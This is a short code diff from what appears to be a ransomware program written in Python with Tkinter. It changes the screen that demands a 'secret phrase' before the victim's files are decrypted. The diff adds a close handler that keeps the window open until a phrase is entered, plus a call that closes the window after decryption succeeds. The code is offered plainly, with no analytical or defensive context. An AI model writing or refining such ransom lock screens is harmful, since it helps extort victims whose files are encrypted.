@@ -134,10 +134,25 @@ def Submit():
         messagebox.showerror("Incorrect secret phrase", "TYou entered the wrong phrase. Two trials remaining.")
     else:
         messagebox.showinfo("Congrats!", "Your files have been decrypted.")
+        root.destroy()
         
 
 
 # On close function
+def onclose():
+    user_phrase=input.get().strip()
+    if not user_phrase:
+        messagebox.showwarning("Input required", "You must enter the secret phrase to continue")
+        return
+
+    done=decrypt(user_phrase)
+
+    if not done:
+        messagebox.showerror("Incorrect secret phrase", "TYou entered the wrong phrase. Two trials remaining.")
+    else:
+        messagebox.showinfo("Congrats!", "Your files have been decrypted.")
+        root.destroy()
+   
 
 # Read files
 def relativePath(relative_path):
